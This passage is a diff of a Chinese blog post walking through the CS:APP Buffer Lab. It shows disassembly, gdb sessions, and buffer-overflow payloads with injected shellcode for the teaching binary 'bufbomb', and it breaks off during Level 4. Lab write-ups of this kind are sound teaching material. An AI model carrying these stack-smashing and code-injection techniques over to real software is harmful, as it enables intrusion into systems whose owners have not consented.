@@ -1,416 +1,156 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-    <head prefix="og: https://ogp.me/ns#">
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="color-scheme" content="light dark">
-  
-  <title>CS:APP-Buffer Lab - 黄阿信</title>
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    <link rel='manifest' href='/manifest.json'>
-  
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico"><link rel="mask-icon" href="/images/favicon.ico" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"yalexin.gitee.io",root:"/",scheme:"Gemini",version:"7.7.1",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!0},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!1,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="CS:APP2e上面的32位旧实验，现已被Attack Lab实验替代。 老规矩，先反汇编 1objdump -d bufbomb &gt; bufbomb.s   注意： IA-32体系下，过程调用传参与x86-64有些区别，具体需要结合汇编代码进行分析  生成cookie 12$ .&#x2F;makecookie yalexin0x56e63394  Level 0: Candle本关卡需要我们利用缓"><meta property="og:type" content="article"><meta property="og:title" content="CS:APP-Buffer Lab"><meta property="og:url" content="https://yalexin.gitee.io/2023/10/01/CS-APP-Buffer-Lab/index.html"><meta property="og:site_name" content="黄阿信"><meta property="og:description" content="CS:APP2e上面的32位旧实验，现已被Attack Lab实验替代。 老规矩，先反汇编 1objdump -d bufbomb &gt; bufbomb.s   注意： IA-32体系下，过程调用传参与x86-64有些区别，具体需要结合汇编代码进行分析  生成cookie 12$ .&#x2F;makecookie yalexin0x56e63394  Level 0: Candle本关卡需要我们利用缓"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://cdn.yalexin.top/image-20230731145134933.png"><meta property="og:image" content="https://cdn.yalexin.top/image-20230731214954748.png"><meta property="og:image" content="https://cdn.yalexin.top/image-20230801142819012.png"><meta property="article:published_time" content="2023-10-01T06:45:23.000Z"><meta property="article:modified_time" content="2023-10-03T07:00:33.968Z"><meta property="article:author" content="YaleXin"><meta property="article:tag" content="汇编"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.yalexin.top/image-20230731145134933.png"><link rel="canonical" href="https://yalexin.gitee.io/2023/10/01/CS-APP-Buffer-Lab/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>CS:APP-Buffer Lab | 黄阿信</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">黄阿信</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">要么改变世界，要么适应世界。</p></div><div class="site-nav-right"><div class="toggle popup-trigger"></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> 首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i> 标签<span class="badge">120</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> 分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> 归档<span class="badge">127</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-fw fa-book"></i> 留言板</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i> 友链</a></li></ul></nav></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://yalexin.gitee.io/2023/10/01/CS-APP-Buffer-Lab/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/uploads/cat_mouse.jpg"><meta itemprop="name" content="YaleXin"><meta itemprop="description" content="学渣一枚"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="黄阿信"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> CS:APP-Buffer Lab</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2023-10-01 14:45:23" itemprop="dateCreated datePublished" datetime="2023-10-01T14:45:23+08:00">2023-10-01</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span> <span class="post-meta-item-text">更新于</span> <time title="修改时间：2023-10-03 15:00:33" itemprop="dateModified" datetime="2023-10-03T15:00:33+08:00">2023-10-03</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%95%99%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">教程</span></a></span></span><span id="/2023/10/01/CS-APP-Buffer-Lab/" class="post-meta-item leancloud_visitors" data-flag-title="CS:APP-Buffer Lab" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span class="leancloud-visitors-count"></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span>9.2k</span></span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span>8 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p><em>CS:APP2e</em>上面的32位旧实验，现已被<em>Attack Lab</em>实验替代。</p><p>老规矩，先反汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.s</span><br></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>： IA-32体系下，过程调用传参与x86-64有些区别，具体需要结合汇编代码进行分析</p></blockquote><p>生成cookie</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./makecookie yalexin</span></span><br><span class="line">0x56e63394</span><br></pre></td></tr></table></figure><h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>本关卡需要我们利用缓冲区溢出，控制程序走到<code>smoke</code>函数<a id="more"></a></p><p>相关汇编如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">080491f4 &lt;getbuf&gt;:</span><br><span class="line"> ; 注意，栈中还保留了ebp</span><br><span class="line"> 80491f4:	55                   	push   %ebp</span><br><span class="line"> 80491f5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80491f7:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> ; buf字符串地址距离栈底0x28个字节</span><br><span class="line"> 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 80491fd:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8049200:	e8 f5 fa ff ff       	call   8048cfa &lt;Gets&gt;</span><br><span class="line"> 8049205:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804920a:	c9                   	leave</span><br><span class="line"> 804920b:	c3                   	ret</span><br></pre></td></tr></table></figure><p>综上，我们输入字符串时候，应输入0x28个字符，然后再输入4个字符，把ebp覆盖，才可以输入我们的返回地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 0.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 18 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 0.txt | ./bufbomb -u yalexin  </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>在这以关卡中，我们要调用<code>fizz</code>函数，同时要传入一个变量，下面是<code>fizz</code>函数的部分代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08048c42 &lt;fizz&gt;:</span><br><span class="line"> 8048c42:	55                   	push   %ebp</span><br><span class="line"> 8048c43:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c45:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> ; 通过观察，我们可以知道fizz的参数val是通过堆栈的方式传递</span><br><span class="line"> ; 加8是因为要跳过返回地址</span><br><span class="line"> 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br></pre></td></tr></table></figure><p>因此我们要在栈上放入我们的cookie：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 1.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 42 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">42 8c 04 08 94 33 e6 56 &#x2F;* 前4个作为调用fix后的返回地址，我们可以随便设置，后4个是函数参数，即我们的cookie *&#x2F;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 1.txt | ./bufbomb -u yalexin    </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Fizz!: You called fizz(0x56e63394)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>这一关卡我们要设置全局变量，同时调用bang的时候要传入一个参数，我们先通过gdb查看<code>getbuf</code>函数中字符串<code>buf</code>的地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gdb bufbomb </span><br><span class="line">b getbuf</span><br><span class="line">r -u yalexin    </span><br><span class="line">b</span><br><span class="line">b</span><br><span class="line">EAX  0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) —▸ 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">*EIP  0x8049200 (getbuf+12) —▸ 0xfffaf5e8 ◂— 0xfffaf5e8</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">        arg[1]: 0xf7e1f484 (unsafe_state) —▸ 0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line">        arg[2]: 0x12e13746</span><br><span class="line">        arg[3]: 0xd7653000</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret</span><br></pre></td></tr></table></figure><p>实际上eax中的值就是我们的buf字符串的地址，为0x55683698。该地址可以方便我们定位我们输入的代码（放到栈上）</p><p>查找全局变量<code>global_value</code>的地址比较简单，只需要观察<code>bang</code>函数的汇编代码即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048c9d &lt;bang&gt;:</span><br><span class="line"> 8048c9d:	55                   	push   %ebp</span><br><span class="line"> 8048c9e:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ca0:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax</span><br><span class="line"> 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br><span class="line"> 8048cae:	75 26                	jne    8048cd6 &lt;bang+0x39&gt;</span><br><span class="line"> 8048cb0:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048cb4:	c7 44 24 04 60 a3 04 	movl   $0x804a360,0x4(%esp)</span><br></pre></td></tr></table></figure><p>因此全局变量<code>global_value</code>的地址为<code>0x804d100</code>（通过观察<code>fizz</code>函数的汇编，我们可以知道<code>0x804d108</code>是<code>cookie</code>的地址）</p><p>下一步我们就是构建修改全部变量、跳转至<code>bang</code>函数的汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 2_code.s</span><br><span class="line">mov    $0x804d100,%eax</span><br><span class="line">movl   $0x56e63394,(%eax)</span><br><span class="line">push   $0x8048c9d # bang 地址入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>生成对应的字节码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 2_code.s</span><br><span class="line">objdump -d 2_code.o &gt; 2_code.d</span><br><span class="line">cat 2_code.d</span><br><span class="line">2_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   b8 00 d1 04 08          mov    $0x804d100,%eax</span><br><span class="line">   5:   c7 00 94 33 e6 56       movl   $0x56e63394,(%eax)</span><br><span class="line">   b:   68 9d 8c 04 08          push   $0x8048c9d</span><br><span class="line">  10:   c3    					ret</span><br></pre></td></tr></table></figure><p>下一步就是开始布局堆栈了，栈上内容大致如下图:</p><p><img src="https://cdn.yalexin.top/image-20230731145134933.png" alt="image-20230731145134933"></p><p>因此payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 2.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 c8 36 68 55 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">b8 00 d1 04 08 c7 00 94</span><br><span class="line">33 e6 56 68 9d 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 2.txt | ./bufbomb -u yalexin   </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Bang!: You set global_value to 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>本关卡需要我们回到从<code>getbuf</code>函数回到<code>test</code>函数时候，返回值为我们的<code>cookie</code>值，并且还是以正常方式返回，意味着我们不能够破坏<code>test</code>的栈帧。</p><p>想要修改返回值，我们可以在程序返回前修改<code>eax</code>的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 3_code.s</span></span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048dbe #  调用getbuf后的返回地址 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>生成对应的字节码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -m32 3_code.s</span><br><span class="line">objdump -d 3_code.o &gt; 3_code.d</span><br><span class="line">cat 3_code.d</span><br><span class="line">3_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   5:   58                      pop    %eax</span><br><span class="line">   6:   68 be 8d 04 08          push   $0x8048dbe</span><br><span class="line">   b:   c3                      ret</span><br></pre></td></tr></table></figure><p>下一步就是开始布局堆栈了:</p><p><img src="https://cdn.yalexin.top/image-20230731214954748.png" alt="image-20230731214954748"></p><p>为了得到旧的<code>ebp</code>的值，我们可以借助gdb，将断点下到getbuf处：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> gdb bufbomb</span><br><span class="line"> b getbuf</span><br><span class="line"> run -u yalexin</span><br><span class="line"> *EAX  0xe9e9dc4</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe04ebb5a</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) ◂— 0x2774 /* "t'" */</span><br><span class="line"> EIP  0x80491fa (getbuf+6) ◂— lea    eax, [ebp - 0x28]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]             &lt;_reserved+1037976&gt;</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line">   0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret    </span><br><span class="line"> </span><br><span class="line">   0x804920c &lt;getbufn&gt;       push   ebp</span><br><span class="line">   0x804920d &lt;getbufn+1&gt;     mov    ebp, esp</span><br><span class="line">   0x804920f &lt;getbufn+3&gt;     sub    esp, 0x218</span><br><span class="line">   0x8049215 &lt;getbufn+9&gt;     lea    eax, [ebp - 0x208]</span><br><span class="line">   0x804921b &lt;getbufn+15&gt;    mov    dword ptr [esp], eax</span><br></pre></td></tr></table></figure><p>虽然此时<code>ebp=0x556836c0</code>,但是该值并不是原先<code>test</code>函数对应的<code>ebp</code>，实际上该地址中对应的<code>0x556836f0</code>才是原先<code>test</code>函数对应的<code>ebp</code>。</p><p>因此最终的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* 3.txt *&#x2F;</span><br><span class="line">68 94 33 e6 56 58 68 be</span><br><span class="line">8d 04 08 c3 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">f0 36 68 55 98 36 68 55 &#x2F;* 前4个字节修补为旧的ebp，后4个字节覆盖返回地址(即buf字符串地址) *&#x2F;</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 3.txt | ./bufbomb -u yalexin</span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Boom!: getbuf returned 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure><h2 id="Level-4-Nitroglycerin"><a href="#Level-4-Nitroglycerin" class="headerlink" title="Level 4: Nitroglycerin"></a>Level 4: Nitroglycerin</h2><p>本关卡跟上一个类似，只不过此时栈上的内存地址是”随机“的，这就给我们定位我们的攻击代码带来了难度。</p><p>我们先来看一张图</p><p><img src="https://cdn.yalexin.top/image-20230801142819012.png" alt="image-20230801142819012"></p><p>上图是<code>testn</code>正常调用<code>getbufn</code>的栈帧情况，从图中我们可以知道，如果我们尝试利用栈溢出漏洞，将<code>getbufn</code>的返回值修改，那么溢出过程我们也会将<code>ebp_1</code>覆盖为我们所设定的值，而为了使得我们能够正常回到<code>testn</code>中，我们还应该恢复正确的<code>ebp</code>寄存器，然而不幸的是，本关卡中，栈上上的地址都是随机化的，因此我们不能够借助gdb直接获取<code>ebp_1</code>的值。</p><p>但是实际上我们可以想象一下，当程序即将从<code>getbuf</code>中返回到<code>testn</code>时，即即将执行<code>getbufn</code>的<code>ret</code>指令时，此时esp的值为图中的<code>ebp2+4</code>,当前的<code>esp</code>再加上0x28即为当初的<code>ebp_1</code>的值，因此我们可以借助相对位置来恢复<code>ebp</code>，因此栈上的攻击代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 4_code.s</span><br><span class="line"># 恢复ebp</span><br><span class="line">lea 0x28(%esp),%ebp</span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048e3a #  修改返回地址</span><br><span 